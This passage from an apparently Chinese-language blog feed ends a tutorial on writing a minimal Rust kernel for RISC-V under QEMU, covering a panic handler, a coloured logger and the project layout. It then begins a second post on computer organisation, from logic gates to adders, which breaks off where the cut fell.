<p>在rust语言中，trait(中文翻译:特质，特征)是一种类型，用于描述一组方法的集合。trait可以用来定义接口(interface)，并可以被其他类型实现。 举个例子，假设我们有一个简单的rust程序，其中有一个名为Shape的trait，用于描述形状:</p> <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Shape</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span>;<br>&#125;<br></code></pre></td></tr></table></figure>  <p>我们可以使用这个trait来定义一个圆形类型:</p> <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Circle</span> &#123;<br>    radius: <span class="hljs-type">f64</span>,<br>&#125;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Circle</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">f64</span> &#123;<br>        <span class="hljs-number">3.14</span> * <span class="hljs-keyword">self</span>.radius * <span class="hljs-keyword">self</span>.radius<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>  <p>这样，我们就可以使用Circle类型的实例调用area方法了</p> <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">c</span> = Circle &#123; radius: <span class="hljs-number">1.0</span> &#125;;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Circle area: &#123;&#125;&quot;</span>, c.<span class="hljs-title function_ invoke__">area</span>());  <span class="hljs-comment">// 输出: Circle area: 3.14</span><br></code></pre></td></tr></table></figure>          </div><hr><h2 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h2><p><strong>错误处理</strong>是编程的重要一环，它能够保证程序的可靠性和可用性，使得程序能够从容应对更多突发状况而不至于过早崩溃，rust将错误分为可恢复和不可恢复错误两大类，这里我们主要关心不可恢复错误，在rust中遇到不可恢复错误，程序会直接报错退出</p><p>例如，使用<code>panic!</code>宏便会直接触发一个不可恢复错误并使程序退出</p><p>不过在我们的内核中，目前不可恢复错误的处理机制还不完善</p><p>现在我们借助前面实现的<code>println!</code>宏和<code>shutdown</code>函数，完善<code>#[panic_handler]</code>，在<code>panic</code>函数中打印错误信息并关机</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#![feature(panic_info_message)]</span><br><br><span class="hljs-comment">// os/src/lang_item.rs</span><br><span class="hljs-keyword">use</span> crate::sbi::shutdown;<br><span class="hljs-keyword">use</span> core::panic::PanicInfo;<br><br><span class="hljs-meta">#[panic_handler]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">panic</span>(info: &amp;PanicInfo) <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(location) = info.<span class="hljs-title function_ invoke__">location</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;Panicked at &#123;&#125;:&#123;&#125; &#123;&#125;&quot;</span>,<br>            location.<span class="hljs-title function_ invoke__">file</span>(),<br>            location.<span class="hljs-title function_ invoke__">line</span>(),<br>            info.<span class="hljs-title function_ invoke__">message</span>().<span class="hljs-title function_ invoke__">unwrap</span>()<br>        );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Panicked: &#123;&#125;&quot;</span>, info.<span class="hljs-title function_ invoke__">message</span>().<span class="hljs-title function_ invoke__">unwrap</span>());<br>    &#125;<br>    <span class="hljs-title function_ invoke__">shutdown</span>(<span class="hljs-literal">true</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rust_main</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-title function_ invoke__">clear_bss</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello, world!&quot;</span>);<br>    <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;Shutdown machine!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功!</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[RustSBI output]</span><br>Hello, world!<br>Panicked at <span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.rs</span>:<span class="hljs-number">26</span> Shutdown machine!<br></code></pre></td></tr></table></figure><div class="note note-success">            <p><strong>Rust Tips：Rust 可恢复错误</strong></p> <p>在有可能出现错误时，rust函数的返回值可以属于一种特殊的类型，该类型可以涵盖两种情况:要么函数正常退出，则函数返回正常的返回值；要么函数执行过程中出错，则函数返回出错的类型。rust的类型系统保证这种返回值不会在程序员无意识的情况下被滥用，即程序员必须显式对其进行分支判断或者强制排除出错的情况。如果不进行任何处理，那么无法从中得到有意义的结果供后续使用或是无法通过编译。这样，就杜绝了很大一部分因程序员的疏忽产生的错误(如不加判断地使用某函数返回的空指针)</p> <p>在rust中有两种这样的特殊类型，它们都属于枚举结构:</p> <ul> <li><p><code>Option&lt;T&gt;</code>既可以有值<code>Option::Some&lt;T&gt;</code>，也有可能没有值 <code>Option::None</code></p> </li> <li><p><code>Result&lt;T, E&gt;</code>既可以保存某个操作的返回值<code>Result::Ok&lt;T&gt;</code>，也可以表明操作过程中出现了错误<code>Result::Err&lt;E&gt;</code></p> </li> </ul> <p>我们可以使用$Option&#x2F;Result$来保存一个不能确定存在&#x2F;不存在或是成功&#x2F;失败的值。之后可以通过匹配<em>if let</em>或是在能够确定的场合直接通过<strong>unwrap</strong>将里面的值取出，详细的内容可以参考rust官方文档!</p> <p>链接: <a href="https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html">https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html</a></p>           </div><p>最后，我们再来完善一下<code>日志输出</code>，并实现<strong>彩色打印</strong>!</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">/*！</span><br><span class="hljs-comment">本模块利用 log crate 为你提供了日志功能，使用方式见 main.rs.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">use</span> log::&#123;<span class="hljs-keyword">self</span>, Level, LevelFilter, Log, Metadata, Record&#125;;<br><br><span class="hljs-keyword">struct</span>  <span class="hljs-title class_">SimpleLogger</span>;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Log</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">SimpleLogger</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">enabled</span>(&amp;<span class="hljs-keyword">self</span>, _metadata: &amp;Metadata) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span> &#123;<br>        <span class="hljs-comment">// whether</span><br>        <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">log</span>(&amp;<span class="hljs-keyword">self</span>, record: &amp;Record) &#123;<br>        <span class="hljs-keyword">if</span> !<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">enabled</span>(record.<span class="hljs-title function_ invoke__">metadata</span>()) &#123;<br>            <span class="hljs-comment">// 元信息</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">color</span> = <span class="hljs-keyword">match</span> record.<span class="hljs-title function_ invoke__">level</span>() &#123;<br>            Level::Error =&gt; <span class="hljs-number">31</span>, <span class="hljs-comment">//Red</span><br>            Level::Warn =&gt; <span class="hljs-number">93</span>, <span class="hljs-comment">// BrightYellow</span><br>            Level::Info =&gt; <span class="hljs-number">34</span>, <span class="hljs-comment">//Blue</span><br>            Level::<span class="hljs-built_in">Debug</span> =&gt; <span class="hljs-number">32</span>, <span class="hljs-comment">//Green</span><br>            Level::Trace =&gt; <span class="hljs-number">90</span>, <span class="hljs-comment">//BrightBlack</span><br>        &#125;;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;\u&#123;1B&#125;[&#123;&#125;m[&#123;:&gt;5&#125;] &#123;&#125;\u&#123;1B&#125;[0m&quot;</span>, <span class="hljs-comment">// 神秘</span><br>            color,<br>            record.<span class="hljs-title function_ invoke__">level</span>(), <span class="hljs-comment">// 日志等级</span><br>            record.<span class="hljs-title function_ invoke__">args</span>(), <span class="hljs-comment">// 格式化内容</span><br>        );<br>    &#125;<br>    <span class="hljs-comment">// 刷新</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">flush</span>(&amp;<span class="hljs-keyword">self</span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>() &#123;<br>    <span class="hljs-keyword">static</span> LOGGER: SimpleLogger = SimpleLogger;<br>    log::<span class="hljs-title function_ invoke__">set_logger</span>(&amp;LOGGER).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    log::<span class="hljs-title function_ invoke__">set_max_level</span>(<span class="hljs-keyword">match</span> <span class="hljs-built_in">option_env!</span>(<span class="hljs-string">&quot;LOG&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">&quot;ERROR&quot;</span>) =&gt; LevelFilter::Error,<br>        <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">&quot;WARN&quot;</span>) =&gt; LevelFilter::Warn,<br>        <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">&quot;INFO&quot;</span>) =&gt; LevelFilter::Info,<br>        <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">&quot;DEBUG&quot;</span>) =&gt; LevelFilter::<span class="hljs-built_in">Debug</span>,<br>        <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">&quot;TRACE&quot;</span>) =&gt; LevelFilter::Trace,<br>        _ =&gt; LevelFilter::Info,<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>最后的最后，调整main函数，验证全过程!</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">//! The main module and entrypoint</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! The operating system and app also starts in this module. Kernel code starts</span><br><span class="hljs-comment">//! executing from `entry.asm`, after which [`rust_main()`] is called to</span><br><span class="hljs-comment">//! initialize various pieces of functionality [`clear_bss()`]. (See its source code for</span><br><span class="hljs-comment">//! details.)</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! We then call [`println!`] to display `Hello, world!`.</span><br><br><span class="hljs-meta">#![deny(missing_docs)]</span><br><span class="hljs-meta">#![deny(warnings)]</span><br><span class="hljs-meta">#![no_main]</span><br><span class="hljs-meta">#![no_std]</span><br><br><span class="hljs-keyword">use</span> core::arch::global_asm;<br><span class="hljs-keyword">use</span> log::*;<br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">mod</span> console;<br><span class="hljs-keyword">mod</span> lang_items;<br><span class="hljs-keyword">mod</span> logging;<br><span class="hljs-keyword">mod</span> sbi;<br><br>global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;entry.asm&quot;</span>));<br><br><span class="hljs-comment">/// clear BSS segment</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">clear_bss</span>() &#123;<br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sbss</span>();<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ebss</span>(); <br>    &#125;<br>    (sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>..ebss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>).for_each(|a| <span class="hljs-keyword">unsafe</span> &#123; (a <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>).<span class="hljs-title function_ invoke__">write_volatile</span>(<span class="hljs-number">0</span>) &#125;);<br>&#125;<br><br><span class="hljs-comment">/// the rust entry-point of os</span><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rust_main</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">stext</span>(); <span class="hljs-comment">// begin addr of text segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">etext</span>(); <span class="hljs-comment">// end addr of text segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">srodata</span>(); <span class="hljs-comment">// start addr of Read-Only data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">erodata</span>(); <span class="hljs-comment">// end addr of Read-Only data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sdata</span>(); <span class="hljs-comment">// start addr of data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">edata</span>(); <span class="hljs-comment">// end addr of data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sbss</span>(); <span class="hljs-comment">// start addr of BSS segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ebss</span>(); <span class="hljs-comment">// end addr of BSS segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">boot_stack_lower_bound</span>(); <span class="hljs-comment">// stack lower bound</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">boot_stack_top</span>(); <span class="hljs-comment">// stack top</span><br>    &#125;<br>    <span class="hljs-title function_ invoke__">clear_bss</span>();<br>    logging::<span class="hljs-title function_ invoke__">init</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[kernel] Hello World!!!!!&quot;</span>);<br>    trace!(<br>        <span class="hljs-string">&quot;[kernel] .text [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        stext <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, etext <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    debug!(<br>        <span class="hljs-string">&quot;[kernel] .rodata [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        srodata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, erodata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    info!(<br>        <span class="hljs-string">&quot;[kernel] .data [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        sdata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, edata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    warn!(<br>        <span class="hljs-string">&quot;[kernel] boot_stack top=bottom=&#123;:#x&#125;, lower_bound=&#123;:#x&#125;&quot;</span>,<br>        boot_stack_top <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, boot_stack_lower_bound <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    error!(<span class="hljs-string">&quot;[kernel] .bss [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>, sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, ebss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br><br>    <span class="hljs-comment">// CI autotest success: sbi::shutdown(false)</span><br>    <span class="hljs-comment">// CI autotest failed : sbi::shutdown(true)</span><br>    <span class="hljs-comment">// 优雅退场~</span><br>    sbi::<span class="hljs-title function_ invoke__">shutdown</span>(<span class="hljs-literal">false</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>因为提供了<code>Makefile</code>文件，所以直接运行<code>LOG=TRACE make run</code>即可!</p><p><img src="/images/62.png" alt="如图!"></p><p>终于，我们从零开始，逐步实现了$kernel hello world$!!!</p><p>并且还拥有了基础的日志打印与错误处理功能~</p><p>有没有感到成就感满满呢 (｡•ㅅ•｡)♡</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后再梳理一下这整个过程，如图所示</p><p><img src="/images/63.png" alt="总结"></p><p>下面是项目结构</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./os/<span class="hljs-attribute">src</span><br>Rust        <span class="hljs-number">4</span> Files   <span class="hljs-number">119</span> Lines<br>Assembly    <span class="hljs-number">1</span> Files    <span class="hljs-number">11</span> Lines<br><br>├── <span class="hljs-built_in">bootloader</span>(内核依赖的运行在 M 特权级的 SBI 实现，本项目中我们使用 RustSBI)<br>│   └── rustsbi-qemu<span class="hljs-selector-class">.bin</span>(可运行在 qemu 虚拟机上的预编译二进制版本)<br>├── LICENSE<br>├── <span class="hljs-built_in">os</span>(我们的内核实现放在 os 目录下)<br>│   ├── Cargo<span class="hljs-selector-class">.toml</span>(内核实现的一些配置文件)<br>│   ├── Makefile<br>│   └── <span class="hljs-attribute">src</span>(所有内核的源代码放在 os/src 目录下)<br>│       ├── console<span class="hljs-selector-class">.rs</span>(将打印字符的 SBI 接口进一步封装实现更加强大的格式化输出)<br>│       ├── entry<span class="hljs-selector-class">.asm</span>(设置内核执行环境的的一段汇编代码)<br>│       ├── lang_items<span class="hljs-selector-class">.rs</span>(需要我们提供给 Rust 编译器的一些语义项，目前包含内核 panic 时的处理逻辑)<br>│       ├── linker-qemu<span class="hljs-selector-class">.ld</span>(控制内核内存布局的链接脚本以使内核运行在 qemu 虚拟机上)<br>│       ├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.rs</span>(内核主函数)<br>│       └── sbi<span class="hljs-selector-class">.rs</span>(调用底层 SBI 实现提供的 SBI 接口)<br>├── README<span class="hljs-selector-class">.md</span><br>└── <span class="hljs-built_in">rust-toolchain</span>(控制整个项目的工具链版本)<br></code></pre></td></tr></table></figure><p>这便是本篇blog的完整内容了…</p><p>感谢阅读!</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>补充:</p><p>你可能需要一些前置知识:</p><ul><li>API vs ABI</li><li>what is <strong>os</strong> and its function and history</li><li>the concept of <code>abstract</code>(抽象)</li><li><strong>exception control flow</strong> trap &amp; interrupt &amp; exception</li><li><code>process</code> 进程 线程 context CPU</li><li><strong>I&#x2F;O</strong> file system</li><li>execution environment(执行环境)</li><li><strong>address space</strong> virtual address &amp; physical address <code>MMU</code> memory</li><li><strong>virtualization</strong> CPU &amp; memory &lt;&#x3D;&gt; time &amp; space</li><li><strong>concurrency</strong> 并发 &amp; 并行</li><li><code>异步性</code></li><li><code>共享性</code></li><li><code>持久性</code></li></ul><p>畏惧了…</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>QEMU</tag>
      
      <tag>rust</tag>
      
      <tag>risc-v</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nonsense</title>
    <link href="/2026/02/21/nonsense/"/>
    <url>/2026/02/21/nonsense/</url>
    
    <content type="html"><![CDATA[<p>ok啊兄弟们晚上好</p><p>今天也是实在无聊简单了解了一下<code>计算机组成原理</code>，不过也有一些好奇心的因素在就是了</p><p>但是其中具体电路的实现我实在是看不懂，电学本来就没学好，遂放弃理解电路实际组成，只关注抽象的过程，也因此不得不赞叹<strong>抽象</strong>的力量，使得我们不用过多关注于这些复杂的实现!</p><p>取名为nonsense，也算是一种自嘲吧!</p><p>开始吧!</p><hr><p>你有没有想过，你写的c语言程序计算机是怎么运行的?</p><p>根据panorama这篇(其实我还没写完qwq)，可以得知c代码经过<strong>编译器</strong>变为汇编代码，再经过<code>汇编器</code>转化为机器语言，也就是CPU能直接理解的二进制指令，接着，<strong>链接器</strong>把目标文件和<code>共享库</code>整合成一个完整的可执行文件</p><p>当你决定要运行它，这个可执行文件会通过操作系统从<code>硬盘</code>加载到主存(<code>RAM</code>)中，CPU的程序计数器(PC&#x2F;IP)会指向机器代码的起始地址，然后开始一条条执行:取指、译码、执行，再取下一条，循环往复…</p><p>但是等等，二进制指令计算机这个<strong>福瑞</strong>又是怎么看懂的?</p><hr><p>再深入一点吧</p><p>从<code>晶体管</code>开始</p><p>晶体管简单来说可以理解为一个微型开关，只有两种状态:通电即为1，断电即为0</p><p>单个晶体管虽然简单，但可以通过电路组合成<strong>逻辑门</strong>:与门(串联)、或门(并联)、非门和异或门(复杂的电路组合,我反正懵了)</p><p><code>与门</code>是两个输入都为1输出才为1，<code>或门</code>是任意一个输入为1输出就为1，<code>非门</code>则是输入取反，<code>异或门</code>是两个输入不同时输出1，相同则输出0，也就是c语言学过的<strong>位运算</strong>，很好理解</p><p>这些逻辑门就是数字电路的语言，所有后续的计算都建立在它们之上</p><p>直觉来看这些逻辑门似乎能做的事情很有限，但并非如此，我们继续抽象</p><p>先来看看加法是如何实现的，先考虑两位二进制的加法，只需要考虑<code>和</code>和<code>进位</code></p><p>和可以抽象为</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>是不是就是一个<code>异或门</code>便能处理</p><p>再考虑进位</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这个也简单，就是<code>与门</code>吧</p><p>恭喜你，发明了<strong>半加器</strong>!</p><hr><p>然而两位能表示的信息还是太有限了，在真实多位计算中，单个半加器无法处理来自低位的进位，于是我们引入<strong>全加器</strong>!</p><p>全加器在半加器的基础上，额外考虑了前一位的进位，我们进一步抽象，当多个全加器首尾相连时，就可以构成8位，32位甚至64位的多位加法器</p><p>具体电路的实现请原谅我直接忽略了，若好奇请自行查阅资料~</p><p>当然也要考虑最高位的进位，这便是后面标志位寄存器的工作了~</p><p>众所周知，实现了加法，便也实现了减法，减法本质上就是<strong>补码</strong>加法，即</p><p><code>A − B &lt;=&gt; A + (~B + 